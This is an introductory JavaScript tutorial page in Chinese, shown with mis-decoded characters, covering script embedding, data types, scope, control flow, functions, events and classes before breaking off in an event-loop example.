è¯¦å°½å…¥é—¨ä¸æŒ‡å—</h1><h3 id="ç›®å½•-6"><a href="#ç›®å½•-6" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><ol><li><a href="#javascript-%E5%9F%BA%E7%A1%80">JavaScript åŸºç¡€</a><ul><li><a href="#javascript-%E7%AE%80%E4%BB%8B">JavaScript ç®€ä»‹</a></li><li><a href="#%E5%9C%A8%E7%BD%91%E9%A1%B5%E4%B8%AD%E5%BC%95%E5%85%A5-javascript">åœ¨ç½‘é¡µä¸­å¼•å…¥ JavaScript</a></li><li><a href="#javascript-%E8%AF%AD%E6%B3%95">JavaScript è¯­æ³•</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">æ•°æ®ç±»å‹</a><ul><li><a href="#%E5%8E%9F%E5%A7%8B%E7%B1%BB%E5%9E%8B">åŸå§‹ç±»å‹</a></li><li><a href="#%E5%AF%B9%E8%B1%A1%E7%B1%BB%E5%9E%8B">å¯¹è±¡ç±»å‹</a></li></ul></li><li><a href="#%E5%8F%98%E9%87%8F%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F">å˜é‡ä¸ä½œç”¨åŸŸ</a><ul><li><a href="#%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E">å˜é‡å£°æ˜</a></li><li><a href="#%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%8E%E9%97%AD%E5%8C%85">ä½œç”¨åŸŸä¸é—­åŒ…</a></li></ul></li><li><a href="#%E6%8E%A7%E5%88%B6%E6%B5%81">æ§åˆ¶æµ</a><ul><li><a href="#%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5">æ¡ä»¶è¯­å¥</a></li><li><a href="#%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5">å¾ªç¯è¯­å¥</a></li></ul></li><li><a href="#%E5%87%BD%E6%95%B0">å‡½æ•°</a><ul><li><a href="#%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E">å‡½æ•°å£°æ˜</a></li><li><a href="#%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0">ç®­å¤´å‡½æ•°</a></li></ul></li><li><a href="#%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86">äº‹ä»¶å¤„ç†</a></li><li><a href="#%E5%AF%B9%E8%B1%A1%E4%B8%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B">å¯¹è±¡ä¸é¢å‘å¯¹è±¡ç¼–ç¨‹</a></li><li><a href="#%E5%BC%82%E6%AD%A5-javascript">å¼‚æ­¥ JavaScript</a><ul><li><a href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0">å›è°ƒå‡½æ•°</a></li><li><a href="#promise">Promise</a></li><li><a href="#asyncawait">async&#x2F;await</a></li></ul></li><li><a href="#javascript-%E4%B8%8E-dom">JavaScript ä¸ DOM</a><ul><li><a href="#dom-%E6%93%8D%E4%BD%9C">DOM æ“ä½œ</a></li><li><a href="#%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A">äº‹ä»¶ç»‘å®š</a></li></ul></li><li><a href="#%E9%AB%98%E7%BA%A7%E6%A6%82%E5%BF%B5">é«˜çº§æ¦‚å¿µ</a><ul><li><a href="#%E9%97%AD%E5%8C%85">é—­åŒ…</a></li><li><a href="#%E5%8E%9F%E5%9E%8B%E9%93%BE">åŸå‹é“¾</a></li></ul></li><li><a href="#%E8%B0%83%E8%AF%95%E4%B8%8E%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">è°ƒè¯•ä¸é”™è¯¯å¤„ç†</a></li></ol><hr><h3 id="JavaScript-åŸºç¡€"><a href="#JavaScript-åŸºç¡€" class="headerlink" title="JavaScript åŸºç¡€"></a>JavaScript åŸºç¡€</h3><h4 id="JavaScript-ç®€ä»‹"><a href="#JavaScript-ç®€ä»‹" class="headerlink" title="JavaScript ç®€ä»‹"></a>JavaScript ç®€ä»‹</h4><p><strong>JavaScript</strong> æ˜¯ä¸€é—¨åŠ¨æ€çš„ã€åŸºäºäº‹ä»¶é©±åŠ¨çš„ç¼–ç¨‹è¯­è¨€ï¼Œä¸»è¦ç”¨äºå¼€å‘ç½‘é¡µçš„å®¢æˆ·ç«¯äº¤äº’é€»è¾‘ã€‚å®ƒå¯ä»¥æ“ä½œæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ˆDOMï¼‰ï¼Œå®ç°ç”¨æˆ·ç‚¹å‡»ã€è¡¨å•æäº¤ç­‰äº¤äº’æ“ä½œã€‚</p><hr><h4 id="åœ¨ç½‘é¡µä¸­å¼•å…¥-JavaScript"><a href="#åœ¨ç½‘é¡µä¸­å¼•å…¥-JavaScript" class="headerlink" title="åœ¨ç½‘é¡µä¸­å¼•å…¥ JavaScript"></a>åœ¨ç½‘é¡µä¸­å¼•å…¥ JavaScript</h4><p>ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å°† JavaScript æ·»åŠ åˆ° HTML é¡µé¢ä¸­ï¼š</p><ol><li><p><strong>å†…è” JavaScript</strong>ï¼šå°† JavaScript ä»£ç ç›´æ¥åµŒå…¥åˆ° HTML å…ƒç´ çš„ <code>onclick</code> ç­‰äº‹ä»¶å±æ€§ä¸­ã€‚</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Hello World!&#x27;)&quot;</span>&gt;</span>ç‚¹å‡»æˆ‘<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>å†…éƒ¨è„šæœ¬</strong>ï¼šå°† JavaScript ä»£ç æ”¾åœ¨ <code>&lt;script&gt;</code> æ ‡ç­¾ä¸­ï¼Œä½äº HTML æ–‡æ¡£çš„ <code>&lt;head&gt;</code> æˆ– <code>&lt;body&gt;</code> ä¸­ã€‚</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, JavaScript!&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>å¤–éƒ¨è„šæœ¬</strong>ï¼šå°† JavaScript ä»£ç æ”¾åœ¨å¤–éƒ¨æ–‡ä»¶ä¸­ï¼Œé€šè¿‡ <code>&lt;script&gt;</code> æ ‡ç­¾å¼•ç”¨ã€‚</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;scripts.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="JavaScript-è¯­æ³•"><a href="#JavaScript-è¯­æ³•" class="headerlink" title="JavaScript è¯­æ³•"></a>JavaScript è¯­æ³•</h4><p>JavaScript çš„åŸºç¡€è¯­æ³•åŒ…æ‹¬ï¼š</p><ul><li><strong>åŒºåˆ†å¤§å°å†™</strong>ï¼š<code>myVariable</code> ä¸ <code>myvariable</code> æ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡ã€‚</li><li><strong>è¯­å¥ç»“æŸç¬¦</strong>ï¼šæ¯æ¡ JavaScript è¯­å¥å¯ä»¥ç”¨åˆ†å·ï¼ˆ<code>;</code>ï¼‰ç»“æŸã€‚</li><li><strong>æ³¨é‡Š</strong>ï¼šå•è¡Œæ³¨é‡Šç”¨ <code>//</code>ï¼Œå¤šè¡Œæ³¨é‡Šç”¨ <code>/* */</code>ã€‚</li></ul><hr><h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><p>JavaScript ä¸­çš„æ•°æ®ç±»å‹åˆ†ä¸º <strong>åŸå§‹ç±»å‹</strong> å’Œ <strong>å¯¹è±¡ç±»å‹</strong>ã€‚</p><h4 id="åŸå§‹ç±»å‹"><a href="#åŸå§‹ç±»å‹" class="headerlink" title="åŸå§‹ç±»å‹"></a>åŸå§‹ç±»å‹</h4><ul><li><p><strong>Number</strong>ï¼šè¡¨ç¤ºæ•°å­—ï¼Œå¦‚æ•´æ•°å’Œæµ®ç‚¹æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> age = <span class="hljs-number">25</span>;<br><span class="hljs-keyword">let</span> price = <span class="hljs-number">19.99</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>String</strong>ï¼šè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> name = <span class="hljs-string">&#x27;Alice&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>Boolean</strong>ï¼šå¸ƒå°”å€¼ï¼Œåªæœ‰ä¸¤ä¸ªå–å€¼ï¼š<code>true</code> æˆ– <code>false</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> isOpen = <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>null</strong>ï¼šè¡¨ç¤ºç©ºå€¼ï¼Œé€šå¸¸ç”¨äºè¡¨ç¤ºâ€œæ— â€ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> car = <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>undefined</strong>ï¼šè¡¨ç¤ºå˜é‡å·²å£°æ˜ä½†æœªèµ‹å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> car;<br></code></pre></td></tr></table></figure></li><li><p><strong>Symbol</strong>ï¼šè¡¨ç¤ºå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼ˆè¾ƒé«˜çº§çš„ä½¿ç”¨åœºæ™¯ï¼‰ã€‚</p></li></ul><h4 id="å¯¹è±¡ç±»å‹"><a href="#å¯¹è±¡ç±»å‹" class="headerlink" title="å¯¹è±¡ç±»å‹"></a>å¯¹è±¡ç±»å‹</h4><p>å¯¹è±¡æ˜¯å±æ€§çš„é›†åˆï¼Œç”¨æ¥å­˜å‚¨é”®å€¼å¯¹ã€‚æ¯ä¸ªå±æ€§æœ‰ä¸€ä¸ªåå­—ï¼ˆé”®ï¼‰å’Œä¸€ä¸ªå¯¹åº”çš„å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>    <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><hr><h3 id="å˜é‡ä¸ä½œç”¨åŸŸ"><a href="#å˜é‡ä¸ä½œç”¨åŸŸ" class="headerlink" title="å˜é‡ä¸ä½œç”¨åŸŸ"></a>å˜é‡ä¸ä½œç”¨åŸŸ</h3><h4 id="å˜é‡å£°æ˜"><a href="#å˜é‡å£°æ˜" class="headerlink" title="å˜é‡å£°æ˜"></a>å˜é‡å£°æ˜</h4><p>åœ¨ JavaScript ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä¸‰ç§æ–¹å¼å£°æ˜å˜é‡ï¼š<code>var</code>ã€<code>let</code> å’Œ <code>const</code>ã€‚</p><ul><li><p><strong>var</strong>ï¼š<code>var</code> æ˜¯ JavaScript ä¸­ä¼ ç»Ÿçš„å˜é‡å£°æ˜æ–¹å¼ï¼Œå˜é‡æœ‰å‡½æ•°ä½œç”¨åŸŸï¼ˆä½†æ²¡æœ‰å—ä½œç”¨åŸŸï¼‰ï¼Œå¹¶å­˜åœ¨å˜é‡æå‡çš„é—®é¢˜ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>let</strong>ï¼š<code>let</code> æ˜¯ ES6 ä¸­å¼•å…¥çš„ï¼Œç”¨æ¥å£°æ˜å—ä½œç”¨åŸŸå˜é‡ï¼Œèƒ½æœ‰æ•ˆé¿å…å˜é‡æå‡å’Œé‡å¤å£°æ˜é—®é¢˜ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> y = <span class="hljs-number">20</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>const</strong>ï¼š<code>const</code> å£°æ˜å¸¸é‡ï¼Œèµ‹å€¼åä¸èƒ½é‡æ–°èµ‹å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> z = <span class="hljs-number">30</span>;<br></code></pre></td></tr></table></figure></li></ul><h4 id="ä½œç”¨åŸŸä¸é—­åŒ…"><a href="#ä½œç”¨åŸŸä¸é—­åŒ…" class="headerlink" title="ä½œç”¨åŸŸä¸é—­åŒ…"></a>ä½œç”¨åŸŸä¸é—­åŒ…</h4><ul><li><strong>å…¨å±€ä½œç”¨åŸŸ</strong>ï¼šåœ¨å‡½æ•°å¤–å£°æ˜çš„å˜é‡å…·æœ‰å…¨å±€ä½œç”¨åŸŸï¼Œæ‰€æœ‰åœ°æ–¹éƒ½å¯ä»¥è®¿é—®ã€‚</li><li><strong>å‡½æ•°ä½œç”¨åŸŸ</strong>ï¼šåœ¨å‡½æ•°å†…éƒ¨å£°æ˜çš„å˜é‡åªèƒ½åœ¨å‡½æ•°å†…éƒ¨è®¿é—®ã€‚</li><li><strong>å—ä½œç”¨åŸŸ</strong>ï¼š<code>let</code> å’Œ <code>const</code> å£°æ˜çš„å˜é‡å…·æœ‰å—ä½œç”¨åŸŸï¼Œé€‚ç”¨äº <code>&#123;&#125;</code> åŒ…å›´çš„ä»»æ„ä»£ç å—ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-keyword">let</span> message = <span class="hljs-string">&quot;Hello!&quot;</span>;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);  <span class="hljs-comment">// æŠ¥é”™ï¼Œmessage ä¸åœ¨ä½œç”¨åŸŸå†…</span><br></code></pre></td></tr></table></figure><hr><h3 id="æ§åˆ¶æµ"><a href="#æ§åˆ¶æµ" class="headerlink" title="æ§åˆ¶æµ"></a>æ§åˆ¶æµ</h3><h4 id="æ¡ä»¶è¯­å¥"><a href="#æ¡ä»¶è¯­å¥" class="headerlink" title="æ¡ä»¶è¯­å¥"></a>æ¡ä»¶è¯­å¥</h4><p>JavaScript æ”¯æŒ <code>if...else</code> å’Œ <code>switch</code> è¯­å¥ï¼Œç”¨äºå®ç°æ¡ä»¶åˆ¤æ–­ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> age = <span class="hljs-number">20</span>;<br><br><span class="hljs-keyword">if</span> (age &gt;= <span class="hljs-number">18</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;æˆå¹´äºº&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;æœªæˆå¹´&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å¾ªç¯è¯­å¥"><a href="#å¾ªç¯è¯­å¥" class="headerlink" title="å¾ªç¯è¯­å¥"></a>å¾ªç¯è¯­å¥</h4><p>å¸¸è§çš„å¾ªç¯ç»“æ„æœ‰ <code>for</code>ã€<code>while</code> å’Œ <code>do...while</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><h4 id="å‡½æ•°å£°æ˜"><a href="#å‡½æ•°å£°æ˜" class="headerlink" title="å‡½æ•°å£°æ˜"></a>å‡½æ•°å£°æ˜</h4><p>å‡½æ•°æ˜¯ JavaScript çš„æ ¸å¿ƒæ¦‚å¿µï¼Œå‡½æ•°ç”¨äºæ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡æˆ–è®¡ç®—æŸäº›å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greet</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>));  <span class="hljs-comment">// è¾“å‡º &quot;Hello, Alice&quot;</span><br></code></pre></td></tr></table></figure><h4 id="ç®­å¤´å‡½æ•°"><a href="#ç®­å¤´å‡½æ•°" class="headerlink" title="ç®­å¤´å‡½æ•°"></a>ç®­å¤´å‡½æ•°</h4><p>ç®­å¤´å‡½æ•°æ˜¯ ES6 ä¸­å¼•å…¥çš„ä¸€ç§æ›´ç®€æ´çš„å‡½æ•°è¡¨è¾¾æ–¹å¼ï¼Œå°¤å…¶é€‚ç”¨äºå›è°ƒå‡½æ•°å’ŒåŒ¿åå‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = (<span class="hljs-params">name</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greet</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>));<br></code></pre></td></tr></table></figure><p>å½“å‡½æ•°ä½“åªæœ‰ä¸€ä¸ªè¡¨è¾¾å¼æ—¶ï¼Œ<code>return</code> å¯ä»¥çœç•¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = name =&gt; <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br></code></pre></td></tr></table></figure><hr><h3 id="äº‹ä»¶å¤„ç†"><a href="#äº‹ä»¶å¤„ç†" class="headerlink" title="äº‹ä»¶å¤„ç†"></a>äº‹ä»¶å¤„ç†</h3><p>JavaScript æ˜¯åŸºäºäº‹ä»¶é©±åŠ¨çš„è¯­è¨€ï¼Œå¯ä»¥å“åº”ç”¨æˆ·çš„å„ç§äº¤äº’ï¼Œå¦‚ç‚¹å‡»ã€è¾“å…¥ç­‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;button id=<span class="hljs-string">&quot;myButton&quot;</span>&gt;ç‚¹å‡»æˆ‘&lt;/button&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">let</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myButton&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;æŒ‰é’®è¢«ç‚¹å‡»äº†ï¼&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h3 id="å¯¹è±¡ä¸é¢å‘å¯¹è±¡ç¼–ç¨‹"><a href="#å¯¹è±¡ä¸é¢å‘å¯¹è±¡ç¼–ç¨‹" class="headerlink" title="å¯¹è±¡ä¸é¢å‘å¯¹è±¡ç¼–ç¨‹"></a>å¯¹è±¡ä¸é¢å‘å¯¹è±¡ç¼–ç¨‹</h3><p>JavaScript æ˜¯é¢å‘å¯¹è±¡çš„è¯­è¨€ï¼Œæ‰€æœ‰ä¸œè¥¿å‡ ä¹éƒ½æ˜¯å¯¹è±¡ã€‚å¯¹è±¡æ˜¯å±æ€§å’Œæ–¹æ³•çš„é›†åˆã€‚</p><h4 id="åˆ›å»ºå¯¹è±¡"><a href="#åˆ›å»ºå¯¹è±¡" class="headerlink" title="åˆ›å»ºå¯¹è±¡"></a>åˆ›å»ºå¯¹è±¡</h4><p>å¯¹è±¡å¯ä»¥é€šè¿‡å¯¹è±¡å­—é¢é‡ã€æ„é€ å‡½æ•°å’Œ <code>class</code> å…³é”®å­—åˆ›å»ºã€‚</p><ol><li><p><strong>å¯¹è±¡å­—é¢é‡</strong>ï¼š</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>    <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, I am &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>æ„é€ å‡½æ•°</strong>ï¼š</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-keyword">let</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-number">25</span>);<br></code></pre></td></tr></table></figure></li><li><p><strong>Classï¼ˆç±»ï¼‰</strong>ï¼š</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>    &#125;<br>    <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> person2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Charlie&#x27;</span>, <span class="hljs-number">35</span>);<br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="å¼‚æ­¥ç¼–ç¨‹ä¸äº‹ä»¶å¾ªç¯çš„è¯¦ç»†å®¡è®¡"><a href="#å¼‚æ­¥ç¼–ç¨‹ä¸äº‹ä»¶å¾ªç¯çš„è¯¦ç»†å®¡è®¡" class="headerlink" title="å¼‚æ­¥ç¼–ç¨‹ä¸äº‹ä»¶å¾ªç¯çš„è¯¦ç»†å®¡è®¡"></a>å¼‚æ­¥ç¼–ç¨‹ä¸äº‹ä»¶å¾ªç¯çš„è¯¦ç»†å®¡è®¡</h4><p>JavaScript æ˜¯å•çº¿ç¨‹çš„ï¼Œé€šè¿‡å¼‚æ­¥æœºåˆ¶æ¥å¤„ç†éé˜»å¡ä»»åŠ¡ã€‚å¼‚æ­¥ç¼–ç¨‹æ˜¯JavaScriptç¼–ç¨‹ä¸­çš„é‡è¦éƒ¨åˆ†ã€‚</p><ol><li><p><strong>äº‹ä»¶å¾ªç¯çš„è¿è¡Œæœºåˆ¶ï¼š</strong></p><ul><li><p><strong>äº‹ä»¶å¾ªç¯</strong>è´Ÿè´£å¤„ç†ä»»åŠ¡é˜Ÿåˆ—ï¼ˆå¦‚å®šæ—¶å™¨ã€I&#x2F;O æ“ä½œç­‰ï¼‰ï¼ŒJavaScriptå¼•æ“ä¼šæŒç»­æ£€æŸ¥ä»»åŠ¡é˜Ÿåˆ—å¹¶æ‰§è¡Œå…¶ä¸­çš„ä»»åŠ¡ã€‚å¼‚æ­¥ä»»åŠ¡ï¼ˆå¦‚<code>setTimeout</code>ã€<code>Promise</code>ã€<code>async/await</code>ï¼‰ä¼šè¢«æ”¾å…¥ä»»åŠ¡é˜Ÿåˆ—ï¼Œç­‰åˆ°ä¸»çº¿ç¨‹ç©ºé—²æ—¶æ‰§è¡Œã€‚</p><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">jså¤åˆ¶ä»£ç <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Start&quot;</span>);<br>setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Timeout 